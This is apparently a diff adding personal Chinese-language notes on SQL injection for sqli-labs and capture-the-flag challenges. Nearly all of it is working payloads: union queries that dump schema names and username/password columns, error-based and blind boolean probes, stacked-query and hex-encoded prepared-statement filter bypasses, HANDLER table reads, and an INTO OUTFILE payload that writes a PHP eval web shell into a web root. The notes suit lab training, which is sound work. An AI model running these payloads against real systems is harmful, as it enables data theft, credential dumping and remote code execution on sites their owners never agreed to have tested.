@@ -1,0 +1,97 @@
+爆库名
+
+?id=-3") union select 1,2,databases()--+
+
+爆表名
+
+?id=-3") union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+
+
+爆字段名
+
+?id=-3") union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+
+
+ 爆数据
+
+?id=-3") union select 1,2,group_concat(0x5c,username,0x5c,password)from users--+
+
+报错查询
+
+union select updatexml(1,concat(0x7e,select *,0x7e),1) --+
+
+?id=1%27))%20union%20select%201,"<?php%20eval($_REQUEST[1])?>",3%20into%20outfile%20"D:/phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/shell.php"%20--+
+
+
+修改表名(将表名user改为users)alter table user rename to users;
+修改列名(将字段名username改为name)alter table users change uesrname name varchar(30);
+
+
+-1';handler '1919810931114514' open;handler '1919810931114514' read first;#
+
+
+
+' union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS#
+' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#
+' and 0 union select 1,2,fl4g from secret_table #
+
+
+
+
+堆叠注入
+show database --+
+show tables --+
+show columns from `1919810931114514` --+
+预编译
+-1';sEt @sql = CONCAT('se','lect * from `1919810931114514`;');prEpare stmt from @sql;EXECUTE stmt;#
+
+
+
+
+
+
+盲注：
+库名长度
+?id=1%27%20and%20(length(database()))=8%20--+
+库名第一位-------
+?id=1%27%20and （ascii(substr(database(),1,1)))=115 --+
+
+
+
+存储过程绕过
+SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;
+
+
+
+
+
+
+
+这道题目需要我们去对后端语句进行猜测
+
+1、输入非零数字得到的回显1和输入其余字符得不到回显=>来判断出内部的查询语句可能存在有||
+
+2、也就是select 输入的数据||内置的一个列名 from 表名=>即为
+
+select post进去的数据||flag from Flag(含有数据的表名，通过堆叠注入可知)
+
+此时的||起到的作用是or的作用
+
+解法1
+内置的sql语句为
+
+sql=“select”.post[‘query’]."||flag from Flag";
+
+
+
+
+HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，
+该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭
+
+1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#
+
+
+
+
+
+
+
+
